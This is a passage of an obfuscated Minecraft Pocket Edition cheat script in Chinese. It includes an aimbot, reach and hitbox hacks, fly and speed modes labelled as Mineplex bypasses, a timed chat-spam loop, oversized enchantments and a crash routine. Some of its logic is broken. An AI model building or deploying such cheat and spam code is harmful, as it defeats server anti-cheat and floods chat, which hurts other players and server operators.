            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.UNBREAKING, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.SHARPNESS, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.KNOCKBACK, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.FIRE_ASPECT, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.LOOTING, 32767);
            clientMessage(fct + '成功地附魔了剑')
        };
        if (_0x2bf6x1a7[1] == 'bow') {
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.UNBREAKING, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.POWER, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.INFINITY, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.FLAME, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.PUNCH, 32767);
            clientMessage(fct + '成功地附魔了弓')
        };
        if (_0x2bf6x1a7[1] == 'tool') {
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.UNBREAKING, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.FORTUNE, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.EFFICIENCY, 32767);
            clientMessage(fct + '成功地附魔了工具')
        };
        if (_0x2bf6x1a7[1] == 'armor') {
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.UNBREAKING, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.PROTECTION, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.FIRE_PROTECTION, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.PROJECTILE_PROTECTION, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.BLAST_PROTECTION, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.THORNS, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.DEPTH_STRIDER, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.AQUA_AFFINITY, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.FEATHER_FALLING, 32767);
            clientMessage(fct + '成功地附魔了盔甲')
        };
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '[超强附魔(32767)]sword(剑)  bow(弓)  tool(工具) armor(盔甲)放在!fe后面. 例如: !fe sword 将会得到一把很强的剑')
        }
    }
}

function ccrash() {
    c1()
}

function c1() {
    ctx['runOnUiThread'](new java['lang'].Runnable({
        run: function() {
            new android['os'].Handler()['postDelayed'](new java['lang'].Runnable({
                run: function() {
                    c2()
                }
            }), 500)
        }
    }))
}

function c2() {
    ctx['runOnUiThread'](new java['lang'].Runnable({
        run: function() {
            new android['os'].Handler()['postDelayed'](new java['lang'].Runnable({
                run: function() {
                    crash()
                }
            }), 1000)
        }
    }))
}

function fctoast(_0x2bf6x25, _0x2bf6x1b1) {
    try {
        var ctx = com['mojang']['minecraftpe']['MainActivity']['currentMainActivity']['get']();
        ctx['runOnUiThread'](new java['lang'].Runnable({
            run: function() {
                var _0x2bf6x1b2 = android['widget']['Toast']['makeText'](com['mojang']['minecraftpe']['MainActivity']['currentMainActivity']['get'](), '' + _0x2bf6x25, android['widget']['Toast'].LENGTH_LONG);
                var _0x2bf6x130 = new android['widget'].LinearLayout(ctx);
                var _0x2bf6x1b3 = new android['widget'].TextView(ctx);
                if (_0x2bf6x1b1 == null) {
                    _0x2bf6x25 = '随枫吖: ' + _0x2bf6x25
                } else {
                    _0x2bf6x25 = _0x2bf6x1b1 + ': ' + _0x2bf6x25
                };
                _0x2bf6x1b3['setText'](_0x2bf6x25);
                _0x2bf6x1b3['setGravity'](android['view']['Gravity'].CENTER);
                _0x2bf6x1b3['setTextSize'](15);
                _0x2bf6x1b3['setPadding'](10, 10, 10, 10);
                _0x2bf6x1b3['setTextColor'](android['graphics']['Color']['rgb'](255, 128, 0));
                var _0x2bf6x1b4 = new android['graphics']['drawable'].GradientDrawable();
                _0x2bf6x1b4['setColor'](android['graphics']['Color'].BLACK);
                _0x2bf6x1b4['setStroke'](5, android['graphics']['Color']['rgb'](255, 128, 0));
                _0x2bf6x130['addView'](_0x2bf6x1b3);
                _0x2bf6x130['setBackground'](_0x2bf6x1b4);
                _0x2bf6x130['getBackground']()['setAlpha'](150);
                _0x2bf6x1b2['setView'](_0x2bf6x130);
                _0x2bf6x1b2['show']()
            }
        }))
    } catch (e) {
        print(e)
    }
}

function convertToLeet(_0x2bf6x25) {
    var _0x2bf6x26 = _0x2bf6x25['toUpperCase']();
    var _0x2bf6x1b6 = new Array('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z');
    var _0x2bf6x1b7 = new Array('4', '8', '(', '|}', '3', '|=', 'G', '|-|', '1', '_|', '|<', '|_', '|^|', 'N', '0', '|)', 'Q', 'R', '5', '7', '|_|', 'V', 'W', 'X', 'Y', 'Z');
    for (i = 0; i < _0x2bf6x1b6['length']; i++) {
        _0x2bf6x26 = Utils['Text']['replaceAll'](_0x2bf6x1b6[i], _0x2bf6x1b7[i], _0x2bf6x26)
    };
    return _0x2bf6x26
}

function rptask() {
    ctx['runOnUiThread'](new java['lang'].Runnable({
        run: function() {
            new android['os'].Handler()['postDelayed'](new java['lang'].Runnable({
                run: function() {
                    if (aimbotss) {
                        if (Level['getGameMode']() == 1) {
                            _0x2bf6x166 = getNearestEntity(9)
                        } else {
                            _0x2bf6x166 = getNearestEntity(7)
                        };
                        if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                            aimAtEnt(_0x2bf6x166)
                        }
                    };
                    if (aimassistss) {
                        var _0x2bf6x166 = Player['getPointedEntity']();
                        if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                            aimAtEnt(_0x2bf6x166)
                        }
                    };
                    if (backfacess) {
                        var _0x2bf6x1b9 = getPlayerEnt();
                        var _0x2bf6x18c = Math['floor'](Entity['getYaw'](_0x2bf6x1b9));
                        var _0x2bf6x18d = Math['floor'](Entity['getPitch'](_0x2bf6x1b9));
                        if (_0x2bf6x18d <= 189) {
                            Entity['setRot'](_0x2bf6x1b9, _0x2bf6x18c, 192)
                        }
                    };
                    if (twerkss) {
                        tCounter++;
                        if (tCounter == 6) {
                            Entity['setSneaking'](Player['getEntity'](), 1)
                        };
                        if (tCounter == 11) {
                            Entity['setSneaking'](Player['getEntity'](), 0);
                            tCounter = 1
                        }
                    };
                    if (derpss) {
                        var _0x2bf6x1b9 = getPlayerEnt();
                        var _0x2bf6x18c = Math['floor'](Entity['getYaw'](_0x2bf6x1b9));
                        var _0x2bf6x18d = Math['floor'](Entity['getPitch'](_0x2bf6x1b9));
                        Entity['setRot'](_0x2bf6x1b9, _0x2bf6x18c + 30, _0x2bf6x18d)
                    };
                    if (followss) {
                        var _0x2bf6x166 = getNearestEntity(15);
                        if (Utils['Player']['isOnGround']() && getPlayerY() - Entity['getY'](_0x2bf6x166) < -0.8) {
                            setVelY(getPlayerEnt(), 0.4)
                        };
                        if (isDev == true) {
                            var _0x2bf6x1ba = getPlayerX();
                            var _0x2bf6x1bb = getPlayerZ();
                            var _0x2bf6x1bc = Entity['getX'](_0x2bf6x166);
                            var _0x2bf6x1bd = Entity['getZ'](_0x2bf6x166);
                            var _0x2bf6x168 = Math['sqrt'](Math['pow'](_0x2bf6x1ba - _0x2bf6x1bc, 2) + Math['pow'](_0x2bf6x1bb - _0x2bf6x1bd, 2));
                            if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                                setVelX(getPlayerEnt(), -Math['max'](-0.25, Math['min'](0.25, ((_0x2bf6x1ba - _0x2bf6x1bc) / _0x2bf6x168) / 4)));
                                setVelZ(getPlayerEnt(), -Math['max'](-0.25, Math['min'](0.25, ((_0x2bf6x1bb - _0x2bf6x1bd) / _0x2bf6x168) / 4)))
                            }
                        } else {
                            var _0x2bf6x13a = [0, 0, 0];
                            toDirectionalVector(_0x2bf6x13a, (getYaw() + 90) * Math['PI'] / 180, getPitch() * Math['PI'] / 180 * -1);
                            if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                                setVelX(getPlayerEnt(), 0.3 * _0x2bf6x13a[0]);
                                setVelZ(getPlayerEnt(), 0.3 * _0x2bf6x13a[2]);
                                aimAtEnt(_0x2bf6x166)
                            }
                        }
                    };
                    if (sniperss) {
                        var _0x2bf6x166 = getNearestEntity(100);
                        if (_0x2bf6x166 != null && Player['getCarriedItem']() == 261 && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                            bowAimAt(_0x2bf6x166);
                            ModPE['setFov'](13)
                        } else {
                            ModPE['resetFov']()
                        }
                    };
                    if (bowaimbotss && getCarriedItem() == 261) {
                        var _0x2bf6x166 = getNearestEntity(100);
                        if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                            bowAimAt(_0x2bf6x166)
                        }
                    };
                    nx = getPlayerX();
                    ny = getPlayerY();
                    nz = getPlayerZ();
                    eval(rptask())
                }
            }), 900 / 70)
        }
    }))
}
rptask();

function rptask2() {
    ctx['runOnUiThread'](new java['lang'].Runnable({
        run: function() {
            new android['os'].Handler()['postDelayed'](new java['lang'].Runnable({
                run: function() {
                    if (nearwarningss) {
                        var _0x2bf6x166 = getNearestEntity(nwrange);
                        if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                            var _0x2bf6x14a = removeColors(Entity['getNameTag'](_0x2bf6x166));
                            fctoast('
' + _0x2bf6x14a + '
' + 'x: ' + Math['floor'](Entity['getX'](_0x2bf6x166)) + '
' + ' y: ' + Math['floor'](Entity['getY'](_0x2bf6x166)) + '
' + ' z: ' + Math['floor'](Entity['getZ'](_0x2bf6x166)), '附近信息')
                        }
                    };
                    nx = getPlayerX();
                    ny = getPlayerY();
                    nz = getPlayerZ();
                    eval(rptask2())
                }
            }), 2500)
        }
    }))
}
rptask2();

function rptask3() {
    ctx['runOnUiThread'](new java['lang'].Runnable({
        run: function() {
            new android['os'].Handler()['postDelayed'](new java['lang'].Runnable({
                run: function() {
                    if (spamss) {
                        var _0x2bf6x1c0 = [' ', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
                        spamTime++;
                        ln++;
                        if (ln == 27) {
                            ln = 0
                        };
                        Server['sendChat'](_0x2bf6x1c0[ln] + '=' + spamTime + ' ' + spamText + ' ' + spamTime + '=' + _0x2bf6x1c0[ln])
                    };
                    nx = getPlayerX();
                    ny = getPlayerY();
                    nz = getPlayerZ();
                    eval(rptask3())
                }
            }), spamDelay)
        }
    }))
}
rptask3();

function leaveGame() {
    isDev = false;
    canBeDev = false;
    if (leaveG) {
        leaveG = false;
        fctoast('欢迎加入꯭꯭醉꯭仙꯭网꯭络꯭，群聊号码：716069766')
    };
    fctoast('您已离开服务器')
}

//我的世界

function dip2px(ctx, dips) {
    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density)
}
var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
ctx.runOnUiThread(new java.lang.Runnable({
    run: function() {
        var win = new android.widget.PopupWindow();
        var layout = new android.widget.LinearLayout(ctx);
        var button = new android.widget.Button(ctx);
        button.setText("飞")
        button.setOnClickListener(new android.view.View.OnClickListener() {
            onClick: function(v) {
                Entity.setPosition(getPlayerEnt(), Player.getX(), Player.getY() + 1, Player.getZ())
                Player.setFlying(true)
                clientMessage("§6§o§l你可以开始fly了")
            }
        });
        layout.addView(button);
        win.setContentView(layout);
        win.setWidth(105);
        win.setHeight(90);
        win.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(0, 0, 0, 0)))
        win.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, 250, 600);
    }
}));

function dip2px(ctx, dips) {
    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density)
}
var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
ctx.runOnUiThread(new java.lang.Runnable({
    run: function() {
        var win = new android.widget.PopupWindow();
        var layout = new android.widget.LinearLayout(ctx);
        var button = new android.widget.Button(ctx);
        button.setText("设")
        button.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(viewarg) {
                xxx = Player.getX()
                yyy = Player.getY()
                zzz = Player.getZ()
                clientMessage("§b§o§l设置这为传送点")
            }
        }))
        layout.addView(button);
        win.setContentView(layout);
        win.setWidth(105);
        win.setHeight(90);
        win.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(0, 0, 0, 0)))
        win.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.BOTTOM, 230, 600);
    }
}));

function dip2px(ctx, dips) {
    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density)
}
var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
ctx.runOnUiThread(new java.lang.Runnable({
    run: function() {
        var win = new android.widget.PopupWindow();
        var layout = new android.widget.LinearLayout(ctx);
        var button = new android.widget.Button(ctx);
        button.setText("回")
        button.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(viewarg) {
                if (xxx == NaN) {
                    clientMessage("§l§o§a您还没有设置传送点")
                } else {
                    setPosition(getPlayerEnt(), xxx, yyy, zzz)
                    clientMessage("§4§o§l已回到设置传送点")
                }
            }
        }))
        layout.addView(button);
        win.setContentView(layout);
        win.setWidth(105);
        win.setHeight(90);
        win.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(0, 0, 0, 0)))
        win.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.BOTTOM, 130, 600);
    }
}));
var ctx = com['mojang']['minecraftpe']['MainActivity']['currentMainActivity']['get']();
var Button = android['widget']['Button'];
var LinearLayout = android['widget']['LinearLayout'];
var RelativeLayout = android['widget']['RelativeLayout'];
var PopupWindow = android['widget']['PopupWindow'];
var ScrollView = android['widget']['ScrollView'];
var TextView = android['widget']['TextView'];
var CheckBox = android['widget']['CheckBox'];
var Switch = android['widget']['Switch'];
var Toast = android['widget']['Toast'];
var Runnable = java['lang']['Runnable'];
var View = android['view']['View'];
var ColorDrawable = android['graphics']['drawable']['ColorDrawable'];
var Color = android['graphics']['Color'];
var Gravity = android['view']['Gravity'];
var Intent = android['content']['Intent'];
var Uri = android['net']['Uri'];
ModPE['langEdit']('menu.copyright', '§4随枫吖§6随枫吖: §e随枫吖已加载完成');
var bg = new android['graphics']['drawable'].GradientDrawable();
bg['setColor'](android['graphics']['Color'].RED);
bg['setStroke'](4, android['graphics']['Color']['rgb'](255, 0, 255));
bg['setCornerRadius'](2);
var ibg = new android['graphics']['drawable'].GradientDrawable();
ibg['setColor'](android['graphics']['Color'].BLACK);
ibg['setStroke'](5, android['graphics']['Color'].RED);
var mbg = new android['graphics']['drawable'].GradientDrawable();
mbg['setColor'](android['graphics']['Color'].BLACK);
mbg['setStroke'](4, android['graphics']['Color']['rgb'](255, 64, 0));
mbg['setCornerRadius'](2);
var fbg = new android['graphics']['drawable'].GradientDrawable();
fbg['setColor'](android['graphics']['Color'].BLACK);
fbg['setStroke'](5, android['graphics']['Color'].RED);
fbg['setCornerRadius'](3);
var xbg = new android['graphics']['drawable'].GradientDrawable();
xbg['setColor'](android['graphics']['Color'].MAGENTA);
xbg['setStroke'](4, android['graphics']['Color']['rgb'](255, 0, 255));
xbg['setCornerRadius'](2);
var nbg = new android['graphics']['drawable'].GradientDrawable();
nbg['setColor'](android['graphics']['Color'].BLACK);
nbg['setAlpha'](100);
var nnbg = new android['graphics']['drawable'].GradientDrawable();
nnbg['setColor'](android['graphics']['Color'].MAGENTA);
nnbg['setStroke'](4, android['graphics']['Color']['rgb'](0, 128, 128));
var iibg = new android['graphics']['drawable'].GradientDrawable();
iibg['setColor'](android['graphics']['Color'].BLACK);
iibg['setAlpha'](250);
iibg['setStroke'](2, android['graphics']['Color'].RED);
var abg = new android['graphics']['drawable'].GradientDrawable();
abg['setAlpha'](150);
abg['setColor'](android['graphics']['Color'].BLACK);
abg['setStroke'](4, android['graphics']['Color']['rgb'](255, 128, 0));
var gmbg = new android['graphics']['drawable'].GradientDrawable();
gmbg['setColor'](android['graphics']['Color'].RED);
gmbg['setStroke'](2, android['graphics']['Color']['rgb'](255, 0, 255));
gmbg['setCornerRadius'](2);
var jbg = new android['graphics']['drawable'].GradientDrawable();
jbg['setColor'](android['graphics']['Color'].RED);
jbg['setStroke'](10, android['graphics']['Color']['rgb'](255, 0, 255));
jbg['setCornerRadius'](4);
var destructbg = new android['graphics']['drawable'].GradientDrawable();
destructbg['setColor'](android['graphics']['Color'].RED);
destructbg['setStroke'](4, android['graphics']['Color']['rgb'](255, 0, 255));
var theme = nnbg;
var theme1 = mbg;
var module = nbg;
var Utils = {
    Block: {
        isLiquid: function(_0x2bf6x22) {
            if (_0x2bf6x22 >= 8 && _0x2bf6x22 <= 11) {
                return true
            };
            return false
        },
        fastBreak: function() {
            for (i = 0; i < 256; i++) {
                Block['setDestroyTime'](i, 0)
            }
        },
        isLadder: function(_0x2bf6x22) {
            if (_0x2bf6x22 == 65) {
                return true
            };
            return false
        }
    },
    Velocity: {
        calculateSpeed: function() {
            return Math['sqrt'](Math['pow'](Entity['getVelX'](getPlayerEnt()), 2) + Math['pow'](Entity['getVelZ'](getPlayerEnt()), 2))
        }
    },
    Text: {
        replaceAll: function(_0x2bf6x23, _0x2bf6x24, _0x2bf6x25) {
            var _0x2bf6x26 = _0x2bf6x25;
            return _0x2bf6x26['replace'](new RegExp(_0x2bf6x23, 'g'), _0x2bf6x24)
        }
    },
    Player: {
        isInWater: function() {
            if (Utils['Block']['isLiquid'](getTile(Entity['getX'](getPlayerEnt()), Entity['getY'](getPlayerEnt()) - 1.65, Entity['getZ'](getPlayerEnt())))) {
                return true
            } else {
                return false
            }
        },
        isOnLadder: function() {
            if (Utils['Block']['isLadder'](getTile(getPlayerX(), getPlayerY() + 0.001, getPlayerZ()))) {
                return true
            } else {
                return false
            }
        },
        isOnGround: function() {
            var _0x2bf6x27 = Entity['getY'](getPlayerEnt());
            while (_0x2bf6x27 > 1) {
                _0x2bf6x27 -= 1
            };
            if ((Math['round'](_0x2bf6x27 * 100) >= 61 && Math['round'](_0x2bf6x27 * 100) <= 63) && getTile(Entity['getX'](getPlayerEnt()), Entity['getY'](getPlayerEnt()) - 1.65, Entity['getZ'](getPlayerEnt())) != 0 && !Utils['Block']['isLiquid'](getTile(Entity['getX'](getPlayerEnt()), Entity['getY'](getPlayerEnt()) - 1.65, Entity['getZ'](getPlayerEnt())))) {
                return true
            };
            if ((Math['round'](_0x2bf6x27 * 100) >= 11 && Math['round'](_0x2bf6x27 * 100) <= 13) && getTile(Entity['getX'](getPlayerEnt()), Entity['getY'](getPlayerEnt()) - 1.65, Entity['getZ'](getPlayerEnt())) != 0 && !Utils['Block']['isLiquid'](getTile(Entity['getX'](getPlayerEnt()), Entity['getY'](getPlayerEnt()) - 1.65, Entity['getZ'](getPlayerEnt())))) {
                return true
            } else {
                return false
            }
        },
        isCollidedHorizontally: function() {
            var _0x2bf6x28 = Entity['getX'](getPlayerEnt());
            var _0x2bf6x29 = Entity['getZ'](getPlayerEnt());
            var _0x2bf6x2a = Math['round'](_0x2bf6x28 - 0.5);
            var _0x2bf6x2b = Math['round'](_0x2bf6x29 - 0.5);
            while (_0x2bf6x28 < 1) {
                _0x2bf6x28 += 1
            };
            while (_0x2bf6x29 < 1) {
                _0x2bf6x29 += 1
            };
            while (_0x2bf6x28 > 1) {
                _0x2bf6x28 -= 1
            };
            while (_0x2bf6x29 > 1) {
                _0x2bf6x29 -= 1
            };
            if (Math['round'](_0x2bf6x28 * 100) == 31) {
                _0x2bf6x28 -= 0.01
            };
            if (Math['round'](_0x2bf6x29 * 100) == 31) {
                _0x2bf6x29 -= 0.01
            };
            if (Math['round'](_0x2bf6x28 * 100) == 69) {
                _0x2bf6x28 += 0.01
            };
            if (Math['round'](_0x2bf6x29 * 100) == 69) {
                _0x2bf6x29 += 0.01
            };
            if (Math['round'](_0x2bf6x28 * 100) == 30) {
                _0x2bf6x2a--
            };
            if (Math['round'](_0x2bf6x29 * 100) == 30) {
                _0x2bf6x2b--
            };
            if (Math['round'](_0x2bf6x28 * 100) == 70) {
                _0x2bf6x2a++
            };
            if (Math['round'](_0x2bf6x29 * 100) == 70) {
                _0x2bf6x2b++
            };
            if (getTile(_0x2bf6x2a, Entity['getY'](getPlayerEnt()), _0x2bf6x2b) == 0 && getTile(_0x2bf6x2a, Entity['getY'](getPlayerEnt()) - 1, _0x2bf6x2b) == 0) {
                return false
            };
            if (Block['getDestroyTime'](getTile(_0x2bf6x2a, Entity['getY'](getPlayerEnt()) - 1, _0x2bf6x2b)) <= 0.1 && Block['getDestroyTime'](getTile(_0x2bf6x2a, Entity['getY'](getPlayerEnt()), _0x2bf6x2b)) <= 0.1) {
                return false
            };
            if (Math['round'](_0x2bf6x28 * 100) == 30 || Math['round'](_0x2bf6x28 * 100) == 70) {
                return true
            };
            if (Math['round'](_0x2bf6x29 * 100) == 30 || Math['round'](_0x2bf6x29 * 100) == 70) {
                return true
            };
            return false
        }
    }
};
var GUI;
var GUIj;
var GUIe;
var GUIr;
var GUIa;
var GUIg;
var GUIz;
var GUIs;
var GUIv;
var menu;
var menu1;
var menu2;
var menu3;
var menu4;
var exitUI;
var exitcombatUI;
var exitmotionUI;
var exitplayerUI;
var exitmiscUI;
var gmChange = Level['getGameMode']();
var clr = '§';
var fct = '§l§4[§r§6随枫吖§l§4§l]§r§6: ';
var team = new Array();
var leaveG = true;
var VERSION = '5.2.0';
var NAME = '随枫吖';
var DEVELOPERS = '随枫吖';
var MODULES = '5.2.0';
var isDev = false;
var canBeDev = false;
var bypasshitbox;
var bypasshitboxs = false;
var bypasshitboxed = false;
var inpvpfly;
var inpvpflys = false;
var inpvpflyed = false;
var mineplexspeed;
var mineplexspeeds = false;
var mineplexspeeded = false;
var mineplexfly;
var mineplexflys = false;
var mineplexflyed = false;
var hitbox;
var hitboxs = false;
var hitboxed = false;
var antikbs;
var antikbss = false;
var antikbed = false;
var attKbTick;
var kbTick;
var kbHealth;
var ndglides;
var ndglidess = false;
var ndglideed = false;
var aimbots;
var aimbotss = false;
var aimboted = false;
var reachs;
var reachss = false;
var reached = false;
var switchreachs;
var switchreached = false;
var sreached = false;
var switchaims;
var switchaimed = false;
var saimed = false;
var grapples;
var grappless = false;
var grappleed = false;
var autoswords;
var autoswordss = false;
var autosworded = false;
var steps;
var stepss = false;
var steped = false;
var csteps;
var cstepss = false;
var csteped = false;
var criticalss;
var criticales = false;
var criticalsed = false;
var critTick = 0;
var criticalTick = 0;
var tapjumps;
var tapjumpss = false;
var tapjumped = false;
var taptps;
var taptpss = false;
var taptped = false;
var speeds;
var speedss = false;
var speeded = false;
var brightblockss;
var brightblocksed = false;
var blockDataValues = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 13, 141, 15, 16, 17, 18, 20, 21, 22, 24, 26, 30, 31, 32, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 53, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 68, 71, 73, 74, 78, 79, 80, 81, 82, 83, 85, 87, 92, 95, 98, 102, 103, 105, 107, 109, 108, 112, 114, 128, 155, 156, 245, 246, 247, 248, 249, 253, 254, 255];
var zoomspeeds;
var zoomspeedss = false;
var zoomspeeded = false;
var jumpspeeds;
var jumpspeedss = false;
var jumpspeeded = false;
var upglides;
var upglidess = false;
var upglideed = false;
var bowaimbots;
var bowaimbotss = false;
var bowaimboted = false;
var criticaltrailss;
var criticaltrailsss = false;
var criticaltrailsed = false;
var highjumps;
var highjumpss = false;
var highjumped = false;
var can = 1;
var canGetHP = 1;
var HP;
var gravity = -0.07840000092983246;
var derps;
var derpss = false;
var derped = false;
var twerks;
var twerkss = false;
var twerked = false;
var tCounter = 0;
var backfaces;
var backfacess = false;
var backfaceed = false;
var autowalks;
var autowalkss = false;
var autowalked = false;
var jetpacks;
var jetpackss = false;
var jetpacked = false;
var cspeeds;
var cspeedss = false;
var cspeeded = false;
var airjumps;
var airjumped = false;
var dolphins;
var dolphinss = false;
var dolphined = false;
var fallbacks;
var fallbackss = false;
var fallbacked = false;
var fallbackX = Player['getX']();
var fallbackY = Player['getY']();
var fallbackZ = Player['getZ']();
var timer = 0;
var solidliquids;
var solidliquidss = false;
var solidliquided = false;
var wallhacks;
var wallhackss = false;
var wallhacked = false;
var stealths;
var stealthss = false;
var stealthed = false;
var glides;
var glidess = false;
var glideed = false;
var glideSpeed = 0.3;
var aimassists;
var aimassistss = false;
var aimassisted = false;
var elevators;
var elevatored = false;
var snipers;
var sniperss = false;
var snipered = false;
var bypassglides;
var bypassglidess = false;
var bypassglideed = false;
var bgtick = 0;
var spams;
var spamss = false;
var spamed = false;
var spamTime = 0;
var spamDelay = 3500;
var ln = 0;
var spamText = 'Remember, no sentence when using !spam';
var hitjumps;
var hitjumpss = false;
var hitjumped = false;
var longhops;
var longhopss = false;
var longhoped = false;
var lhtick = 0;
var placetps;
var placetpss = false;
var placetped = false;
var autoclimbs;
var autoclimbss = false;
var autoclimbed = false;
var acspd = 0.4;
var sglides;
var sglidess = false;
var sglideed = false;
var dmgglides;
var dmgglidess = false;
var dmgglideed = false;
var follows;
var followss = false;
var followed = false;
var forcedestroys;
var forcedestroyss = false;
var forcedestroyed = false;
var fastbreaks;
var fastbreakss = false;
var fastbreaked = false;
var defDestroyTime = [null, 1.5, 0.6, 0.5, 2, 2, 0, -1, null, null, null, null, 0.5, 0.6, 3, 3, 3, 2, 0.2, 0.6, 0.3, 3, 3, null, 0.8, null, 0.2, 0.7, null, null, 4, 0, 0, null, null, 0.8, null, 0, 0, 0, 0, 3, 5, 2, 2, 2, 0, 1.5, 2, 50, 0, 0, null, 2, 2.5, null, 3, 5, 2.5, 0, 0.6, 3.5, 3.5, 1, 3, 0.4, 0.7, 2, 1, null, null, 5, null, 3, 3, null, null, null, 0.1, 0.5, 0.2, 0.4, 0.6, 0, null, 2, 1, 0.4, 0.3, null, 1, 0.5, null, null, -1, 3, null, 1.5, null, null, 5, 0.3, 1, 0, 0, null, 2, 2, 1.5, null, null, 2, null, 2, null, null, null, null, null, null, null, null, null, null, null, null, null, 0.8, null, null, null, null, null, 2, 2, 2, null, null, 2, null, 0, 0, null, null, null, null, null, null, null, null, null, null, null, null, 0.8, 0.8, 2, 2, null, null, null, null, null, null, null, null, null, null, null, 0.5, 0.1, 5, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, 0, 3.5, 50, 5, 0.6, 0.6, 5, null, null, null, null, 0];
var nearwarnings;
var nearwarningss = false;
var nearwarninged = false;
var nwrange = 35;
var fullbrights;
var fullbrightss = false;
var fullbrighted = false;
var leetspeaks;
var leetspeakss = false;
var leetspeaked = false;
var regenerations;
var regenerationss = false;
var regenerationed = false;
var regenX = Player['getX']();
var regenZ = Player['getZ']();
var sregens;
var sregenss = false;
var sregend = false;
var sregened = false;
var lbsgspeeds;
var lbsgspeedss = false;
var lbsgspeeded = false;
var ctrlzooms;
var ctrlzoomed = false;
var zoomed = false;
var escapes;
var escapeed = false;
var frostwalkers;
var frostwalkerss = false;
var frostwalkered = false;
var viewchangers;
var viewchangered = false;
var firepunchs;
var firepunchss = false;
var firepunched = false;
var safewalks;
var safewalkss = false;
var safewalked = false;
var scaffoldwalks;
var scaffoldwalkss = false;
var scaffoldwalked = false;
var arrowdodges;
var arrowdodgess = false;
var arrowdodgeed = false;
var behindhits;
var behindhitss = false;
var behindhited = false;
var sidereachs;
var sidereached = false;
var bedbreakers;
var bedbreakerss = false;
var bedbreakered = false;
var fastfalls;
var fastfallss = false;
var fastfalled = false;
var ghosthands;
var ghosthandss = false;
var ghosthanded = false;
var godmode;
var godmodes = false;
var godmodeed = false;

var tos;

function showChangeLog() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    ctx.runOnUiThread(new java.lang.Runnable({
        run: function() {
            try {
                var tosLayout = new android.widget.LinearLayout(ctx);
                var tosScroll = new android.widget.ScrollView(ctx);
